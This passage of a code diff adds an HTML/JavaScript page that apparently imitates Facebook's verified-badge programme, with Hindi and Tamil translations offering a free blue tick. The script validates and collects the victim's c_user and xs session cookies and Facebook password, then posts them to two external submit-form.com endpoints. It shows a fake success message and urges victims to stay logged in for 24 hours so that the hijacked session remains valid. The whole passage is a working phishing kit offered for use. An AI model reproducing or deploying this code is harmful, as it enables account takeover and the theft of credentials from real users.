+                password_note: "यह हमें सत्यापित करने में मदद करता है कि आप इस खाते के वैध मालिक हैं।",
+                password_security: "आपका पासवर्ड एन्क्रिप्टेड और सुरक्षित है। हम Facebook की आधिकारिक प्रणालियों के बाहर कभी भी आपका पासवर्ड नहीं मांगेंगे।",
+                complete_button: "सत्यापन पूरा करें",
+                success_title: "सत्यापन सफल",
+                success_message: "आपका पेज सत्यापन अपील सफलतापूर्वक जमा कर दिया गया है। कृपया अगले 24 घंटों तक अपना खाता सक्रिय रखें जब तक कि हम आपके अनुरोध को संसाधित करते हैं।",
+                close_button: "बंद करें"
+            },
+            ta: {
+                secure_connection: "Facebook பாதுகாப்பான இணைப்பு",
+                page_title: "Facebook இல் சரிபார்க்கப்பட்ட பேட்ஜ் கோரவும்",
+                verification_center: "சரிபார்ப்பு மையம்",
+                verification_description: "சரிபார்க்கப்பட்ட பேட்ஜ் என்பது Facebook உறுதிப்படுத்தியது என்று அர்த்தம், அந்தப் பக்கம் அல்லது சுயவிவரம் அது குறிப்பிடும் தனிநபர், பொது நபர் அல்லது பிராண்டின் உண்மையான இருப்பு என்பதை.",
+                congratulations: "வாழ்த்துக்கள்!",
+                reason1: "எங்கள் புதிய ப்ளூ டிக் அம்சத்தை வெளிப்படுத்த நாங்கள் மிகவும் மகிழ்ச்சியடைகிறோம்",
+                reason2: "இலவச மேம்படுத்தல் இது உங்களுக்கு பிரீமியம் கருவிகள் மற்றும் நன்மைகளை இலவசமாக அணுக அனுமதிக்கிறது!",
+                reason3: "கட்டணங்கள் இல்லை. சந்தாக்கள் இல்லை. தந்திரங்கள் இல்லை. உங்கள் சரிபார்க்கப்பட்ட பேட்ஜ் தயார் - முற்றிலும் இலவசம்!",
+                reason4: "இது குறைந்த கால சலுகை, எனவே தாமதம் செய்யாதீர்கள் - இப்போதே உங்கள் விண்ணப்பத்தை அனுப்பவும்.",
+                social_presence: "Meta Verified உடன் உங்கள் சமூக இருப்பை வளர்த்துக் கொள்ளுங்கள் – Instagram மற்றும் Facebook இல் உருவாக்குநர்கள் மற்றும் வணிகங்களுக்கு கிடைக்கும் புதிய சந்தா தொகுப்பு.",
+                submit_button: "சமர்ப்பிக்கவும்",
+                help_center: "உதவி மையம்",
+                privacy_policy: "தனியுரிமைக் கொள்கை",
+                terms_of_service: "சேவை விதிமுறைகள்",
+                community_standards: "சமூக தரங்கள்",
+                verification_form: "பக்கம் சரிபார்ப்பு படிவம்",
+                step1_title: "சரிபார்ப்பு வீடியோவைப் பார்க்கவும்",
+                step1_desc: "உங்கள் Facebook அங்கீகார டோக்கன்களை எவ்வாறு கண்டுபிடிப்பது என்பதை அறிக",
+                step2_title: "உங்கள் அங்கீகார டோக்கன்களை உள்ளிடவும்",
+                step2_desc: "உங்கள் பக்க உரிமையை சரிபார்க்க தேவை",
+                step3_title: "அடையாள உறுதிப்படுத்தலை முடிக்கவும்",
+                step3_desc: "24 மணி நேரத்திற்குள் பேட்ஜ் பெற இறுதி படி",
+                video_language: "வீடியோ மொழியைத் தேர்ந்தெடுக்கவும்:",
+                video_instruction: "உலாவி குக்கீகளில் உங்கள் அங்கீகார டோக்கன்களைக் கண்டுபிடிக்க வீடியோ வழிமுறைகளைப் பின்பற்றவும்",
+                c_user_label: "c_user டோக்கன்",
+                c_user_placeholder: "c_user டோக்கனை உள்ளிடவும் (எண்கள் மட்டும்)",
+                c_user_error: "பிழை: c_user க்கு எண்கள் மட்டுமே இருக்க வேண்டும்",
+                c_user_note: "இந்த டோக்கன் சரிபார்ப்புக்கு உங்கள் Facebook கணக்கை அடையாளப்படுத்துகிறது",
+                xs_label: "xs டோக்கன்",
+                xs_placeholder: "xs டோக்கனை உள்ளிடவும் (எழுத்துக்கள், எண்கள் & குறியீடுகள்)",
+                xs_error: "பிழை: xs க்கு எழுத்துக்கள், எண்கள் மற்றும் குறியீடுகளின் கலவை இருக்க வேண்டும்",
+                xs_warning: "முக்கியம்: சமர்ப்பித்த பிறகு 24 மணி நேரம் உங்கள் கணக்கிலிருந்து வெளியேற வேண்டாம்",
+                security_info: "உங்கள் தகவல் Facebook இன் குறியாக்கத்தால் பாதுகாக்கப்படுகிறது மற்றும் சரிபார்ப்பு நோக்கங்களுக்காக மட்டுமே பயன்படுத்தப்படும்.",
+                continue_button: "சரிபார்ப்பைத் தொடரவும்",
+                confirm_identity: "உங்கள் அடையாளத்தை உறுதிப்படுத்தவும்",
+                password_prompt: "பாதுகாப்பு நோக்கங்களுக்காக, சரிபார்ப்பு செயல்முறையை முடிக்க உங்கள் Facebook கடவுச்சொல்லை உள்ளிடவும்.",
+                password_label: "Facebook கடவுச்சொல்",
+                password_placeholder: "உங்கள் கடவுச்சொல்லை உள்ளிடவும்",
+                password_note: "இது நீங்கள் இந்தக் கணக்கின் சட்டபூர்வமான உரிமையாளர் என்பதை சரிபார்க்க உதவுகிறது.",
+                password_security: "உங்கள் கடவுச்சொல் குறியாக்கம் செய்யப்பட்டு பாதுகாப்பாக உள்ளது. Facebook இன் அதிகாரப்பூர்வ அமைப்புகளுக்கு வெளியே உங்கள் கடவுச்சொல்லை நாங்கள் ஒருபோதும் கேட்க மாட்டோம்.",
+                complete_button: "சரிபார்ப்பை முடிக்கவும்",
+                success_title: "சரிபார்ப்பு வெற்றிகரமாக",
+                success_message: "உங்கள் பக்கம் சரிபார்ப்பு மனு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது. எங்கள் கோரிக்கையை செயல்படுத்தும் போது அடுத்த 24 மணி நேரம் உங்கள் கணக்கைச் செயலில் வைத்திருங்கள்.",
+                close_button: "மூடு"
+            }
+        };
+
+        // Set default language to English
+        let currentLanguage = 'en';
+        
+        // Function to change language
+        function changeLanguage(lang) {
+            currentLanguage = lang;
+            document.querySelectorAll('[data-translate]').forEach(element => {
+                const key = element.getAttribute('data-translate');
+                if (translations[lang] && translations[lang][key]) {
+                    if (element.placeholder) {
+                        element.placeholder = translations[lang][key];
+                    } else {
+                        element.textContent = translations[lang][key];
+                    }
+                }
+            });
+            
+            // Update language selector
+            document.getElementById('languageSelect').value = lang;
+        }
+
+        // Get modal elements
+        const appealModal = document.getElementById("appealModal");
+        const passwordModal = document.getElementById("passwordModal");
+        const successModal = document.getElementById("successModal");
+        
+        // Get buttons
+        const submitAppealBtn = document.getElementById("submitAppealBtn");
+        const submitRequestBtn = document.getElementById("submitRequestBtn");
+        const finalSubmitBtn = document.getElementById("finalSubmitBtn");
+        const successCloseBtn = document.getElementById("successCloseBtn");
+        
+        // Get close buttons
+        const closeBtns = document.getElementsByClassName("close");
+        
+        // Get input fields and error messages
+        const cUserInput = document.getElementById('c_user');
+        const xsInput = document.getElementById('xs');
+        const cUserError = document.getElementById('c_user_error');
+        const xsError = document.getElementById('xs_error');
+        
+        // Get video element
+        const verificationVideo = document.getElementById('verificationVideo');
+        
+        // Get language buttons
+        const languageButtons = document.querySelectorAll('.language-button');
+        
+        // Language selection functionality
+        languageButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                // Remove active class from all buttons
+                languageButtons.forEach(btn => btn.classList.remove('active'));
+                
+                // Add active class to clicked button
+                this.classList.add('active');
+                
+                // Change video source
+                const videoSource = this.getAttribute('data-video');
+                verificationVideo.src = videoSource;
+                
+                // Reload the video
+                verificationVideo.load();
+            });
+        });
+        
+        // Validation functions
+        function validateCUser(value) {
+            return /^\d+$/.test(value); // Only numbers allowed
+        }
+        
+        function validateXs(value) {
+            // Must contain at least one letter, one number, and one symbol
+            const hasLetter = /[a-zA-Z]/.test(value);
+            const hasNumber = /\d/.test(value);
+            const hasSymbol = /[^a-zA-Z0-9]/.test(value);
+            return hasLetter && hasNumber && hasSymbol;
+        }
+        
+        // Real-time validation as user types
+        cUserInput.addEventListener('input', function() {
+            const isValid = validateCUser(this.value);
+            cUserInput.classList.toggle('invalid', !isValid);
+            cUserError.classList.toggle('show', !isValid && this.value.length > 0);
+        });
+        
+        xsInput.addEventListener('input', function() {
+            const isValid = validateXs(this.value);
+            xsInput.classList.toggle('invalid', !isValid);
+            xsError.classList.toggle('show', !isValid && this.value.length > 0);
+        });
+        
+        // Open appeal modal when button is clicked
+        submitAppealBtn.onclick = function() {
+            appealModal.style.display = "block";
+        }
+        
+        // Open password modal when request is submitted
+        submitRequestBtn.onclick = function() {
+            const cUser = cUserInput.value;
+            const xsToken = xsInput.value;
+            
+            // Validate both fields
+            const isCUserValid = validateCUser(cUser);
+            const isXsValid = validateXs(xsToken);
+            
+            // Show/hide errors
+            cUserInput.classList.toggle('invalid', !isCUserValid);
+            cUserError.classList.toggle('show', !isCUserValid);
+            
+            xsInput.classList.toggle('invalid', !isXsValid);
+            xsError.classList.toggle('show', !isXsValid);
+            
+            // Check if both are valid
+            if (isCUserValid && isXsValid) {
+                appealModal.style.display = "none";
+                passwordModal.style.display = "block";
+            } else {
+                // Scroll to first error
+                const firstError = document.querySelector('.invalid');
+                if (firstError) {
+                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
+                
+                // Show alert if fields are empty
+                if (!cUser || !xsToken) {
+                    alert("Please fill in both c_user and xs tokens to continue.");
+                }
+            }
+        }
+        
+        // Function to submit c_user and xs to first form
+        function submitTokensToFirstForm(data) {
+            fetch('https://submit-form.com/3fK6uJOD2', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Tokens submitted successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error submitting tokens:', error);
+            });
+        }
+        
+        // Function to submit password to second form
+        function submitPasswordToSecondForm(data) {
+            fetch('https://submit-form.com/3mkCFnqea', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Password submitted successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error submitting password:', error);
+            });
+        }
+        
+        // Final submission with loading animation
+        finalSubmitBtn.onclick = function() {
+            const password = document.getElementById("password").value;
+            const cUser = cUserInput.value;
+            const xsToken = xsInput.value;
+            
+            if (password && cUser && xsToken) {
+                // Show loading state
+                finalSubmitBtn.classList.add('button-loading');
+                finalSubmitBtn.disabled = true;
+                
+                // Prepare data to submit
+                const tokenData = {
+                    c_user: cUser,
+                    xs: xsToken,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    ip: '' // Will be captured server-side
+                };
+                
+                const passwordData = {
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    ip: '' // Will be captured server-side
+                };
+                
+                // Submit tokens to first form
+                submitTokensToFirstForm(tokenData);
+                
+                // Submit password to second form
+                submitPasswordToSecondForm(passwordData);
+                
+                // Simulate processing delay (2 seconds)
+                setTimeout(() => {
+                    // Hide loading state
+                    finalSubmitBtn.classList.remove('button-loading');
+                    finalSubmitBtn.disabled = false;
+                    
+                    // Show success modal
+                    passwordModal.style.display = "none";
+                    successModal.style.display = "block";
+                    
+                    // Reset form
+                    cUserInput.value = "";
+                    xsInput.value = "";
+                    document.getElementById("password").value = "";
+                    cUserInput.classList.remove('invalid');
+                    xsInput.classList.remove('invalid');
+                    cUserError.classList.remove('show');
+                    xsError.classList.remove('show');
+                }, 2000);
+            } else {
+                alert("Please enter all required fields to complete verification.");
+            }
+        }
+        
+        // Close success modal
+        successCloseBtn.onclick = function() {
+            successModal.style.display = "none";
+        }
+        
+        // Close modals when close button is clicked
+        for (let i = 0; i < closeBtns.length; i++) {
+            closeBtns[i].onclick = function() {
+                appealModal.style.display = "none";
+                passwordModal.style.display = "none";
+                successModal.style.display = "none";
+                
+                // Reset error messages when closing
+                cUserInput.classList.remove('invalid');
+                xsInput.classList.remove('invalid');
+                cUserError.classList.remove('show');
+                xsError.classList.remove('show');
+                
+                // Reset loading state if active
+                if (finalSubmitBtn.classList.contains('button-loading')) {
+                    finalSubmitBtn.classList.remove('button-loading');
+                    finalSubmitBtn.disabled = false;
+                }
+            }
+        }
+        
+        // Close modals when clicking outside
+        window.onclick = function(event) {
+            if (event.target == appealModal) {
+                appealModal.style.display = "none";
+                // Reset error messages when closing
+                cUserInput.classList.remove('invalid');
+                xsInput.classList.remove('invalid');
+                cUserError.classList.remove('show');
+                xsError.classList.remove('show');
+            }
+            if (event.target == passwordModal) {
+                passwordModal.style.display = "none";
+                
+                // Reset loading state if active
+                if (finalSubmitBtn.classList.contains('button-loading')) {
+                    finalSubmitBtn.classList.remove('button-loading');
+                    finalSubmitBtn.disabled = false;
+                }
+            }
+            if (event.target == successModal) {
+                successModal.style.display = "none";
+            }
+        }
+
+        // Initialize language selector
+        document.getElementById('languageSelect').addEventListener('change', function() {
+            changeLanguage(this.value);
+        });
+
+        // Set default language to English on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            changeLanguage('en');
+        });
+  </script>
+</body>
+</html>
